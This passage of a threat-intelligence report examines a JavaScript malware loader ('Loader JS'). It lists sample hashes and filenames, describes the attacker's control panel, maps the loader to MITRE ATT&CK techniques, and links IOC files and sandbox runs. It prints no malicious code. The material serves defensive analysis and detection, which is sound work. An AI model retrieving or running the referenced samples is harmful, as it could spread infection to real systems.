  <td><center>Test7</center></td>
</tr>
<tr>
  <td>2020-05-07 23:26:20</td>
  <td>91792ffa6909533367499c32adbbdf03960602734eed6bd2267aa27ecab0efc5</td>
  <td><center>invoice_159306.js</center></td>
  <td><center>JS</center></td>
  <td><center>Test0909</center></td>
</tr>
<tr>
  <td>2020-05-05 18:04:37</td>
  <td>4c01f02882154ccb2ce82f1da5533dc51b7b949cc2459a95eab24c4ee1d5251</td>
  <td><center>SAMPLE.js</center></td>
  <td><center>JS</center></td>
  <td><center>Test1</center></td>
</tr>
<tr>
  <td>2020-05-05 17:29:48</td>
  <td>6c3bb047985ee9996e9cfc8ce03eaf5246538321acbd788dd0b8bab7cf0c8eed</td>
  <td><center>invoice_1593066.js</center></td>
  <td><center>JS</center></td>
  <td><center>Test1</center></td>
</tr>
<tr>
  <td>2020-05-05 07:38:15</td>
  <td>6327035bdec77941d86b6b7ce6794e934235a7994c2235010de129a06b4082ca</td>
  <td><center>invoice_15930610.js</center></td>
  <td><center>JS</center></td>
  <td><center>Test1</center></td>
</tr>
<tr>
  <td>2020-02-25 17:18:04</td>
  <td>9da43b6cca00d58be09f481d803b7cfbf051bb645a892049f1665f3b0c7bb58a</td>
  <td><center>00001.js</center></td>
  <td><center>JS</center></td>
  <td><center>OLD</center></td>
</tr>
<tr>
  <td>2019-12-05 18:33:50</td>
  <td>d1249f91152cdae3b44bdaf819f29dead89ea1783525c4ffc3619287588496a6</td>
  <td><center>sssdlient.js</center></td>
  <td><center>JS</center></td>
  <td><center>1.0.4</center></td>
</tr>
<tr>
  <td>2019-12-05 18:33:49</td>
  <td>6530abff8bae2df855dc513a0dd02d5b06ac4e26d803760f6b9b51290719b088</td>
  <td><center>Client.js</center></td>
  <td><center>JS</center></td>
  <td><center>RAT</center></td>
</tr>
<tr>
  <td>2019-12-03 20:14:30</td>
  <td>6c3bb047985ee9996e9cfc8ce03eaf5246538321acbd788dd0b8bab7cf0c8eed</td>
  <td><center>8888.js</center></td>
  <td><center>JS</center></td>
  <td><center>New JS</center></td>
</tr>
<tr>
  <td>2019-12-02 00:31:56</td>
  <td>37eadeb29765559e0931a41ac4c750b8a3e3c4a1df2c24797317429fbbcf8456</td>
  <td><center>firefox.js</center></td>
  <td><center>JS</center></td>
  <td><center>OLD</center></td>
</tr>
<tr>
  <td>2019-11-21 04:57:25</td>
  <td>8a1ff46bde026a0d727bbd58880d94bbbe5c7c7003bc169a22ebf86c2c221c49</td>
  <td><center>firefox.js</center></td>
  <td><center>JS</center></td>
  <td><center>ZAGRUZ</center></td>
</tr>
<tr>
  <td>2019-09-06 22:58:18</td>
  <td>fcc550358ddeae5061b3bdf1b720be49b39b78356e3cb189cfe26cd170ac7aa2</td>
  <td><center>ml.exe</center></td>
  <td><center>.NET</center></td>
  <td><center>Dorway</center></td>
</tr>
</table>
</h6></center>
<h6>The pictures of the panel given by <a href="https://twitter.com/jorgemieres">Jorge Mieres</a> show interesting informations, first the solution used by the attacker seems called "Loader JS", secondly, few victims can be observed and the error show the presence of an API and would suggest that it is an MAAS solution that used by the attacker.</h6>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional Analysis/Unknown/2020-05-12/Pictures/panel.png"></img></center>
<h6>On this picture, we see that an unknown version is present and looks like one version found (1.0.4), the date would go up that the first versions of JS scripts were made in October 2019 and like the .NET loader that don't use JSON on the informations sends to the C2, that possible that these scripts don't used JSON that explain why that not hunt on using the fact that download the JS-JSON code.</h6>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional Analysis/Unknown/2020-05-12/Pictures/panel2.png"></img></center>
<h6>To conclude, some SFX archive have reference to build on an Russian system, the attacker use probably an MAAS solution. The solution seems to be called "Loader JS" and the code more and more sophisticated in the obfuscation of the payload.<h6>

<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
<h6>This process graph represent the cyber kill chain used by the attacker:</h6>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional Analysis/Unknown/2020-05-12/Pictures/cyberkill.png"></img></center>

<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> The IOC can be exported in <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-05-12/JSON/IOC-JS-Loader_2020_05_16.json">JSON</a> and <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-05-12/CSV/IOC-JS-Loader_2020_05_16.csv">CSV</a></h6>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

<center>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Command-Line Interface<br>User Execution|https://attack.mitre.org/techniques/T1059<br>https://attack.mitre.org/techniques/T1204|
|Persistence|Registry Run Keys / Startup Folder|https://attack.mitre.org/techniques/T1060|
|Defense Evasion|Install Root Certificate|https://attack.mitre.org/techniques/T1130|
|Discovery|Query Registry<br>Remote System Discovery<br>Network Share Discovery|https://attack.mitre.org/techniques/T1012<br>https://attack.mitre.org/techniques/T1018<br>https://attack.mitre.org/techniques/T1135|

</center>

<h6> This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-05-12/JSON/Mitre-JS-Loader_2020_05_16.json">Export in JSON</a></h6>

<h2>Links <a name="Links"></a></h2>
<h6> Original tweet: </h6><a name="tweet"></a>
<ul>
<li><a href="https://twitter.com/malwrhunterteam/status/1255907032944775171">https://twitter.com/malwrhunterteam/status/1255907032944775171</a></li>
<li><a href="https://twitter.com/Racco42/status/1259956832409473027">https://twitter.com/Racco42/status/1259956832409473027</a></li>
<li><a href="https://twitter.com/jorgemieres/status/1255933260472909824">https://twitter.com/jorgemieres/status/1255933260472909824</a></li>
</ul>

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>
<ul>
<li><a href="https://app.any.run/tasks/ffbdbe68-c15f-4061-bb63-bd18b63f5aed">invoice_159306.js</a></li>
<li><a href="https://app.any.run/tasks/ec895903-5e06-4c4e-87b3-a06284bba7de">invoice_159306.zip</a></li>
</ul>
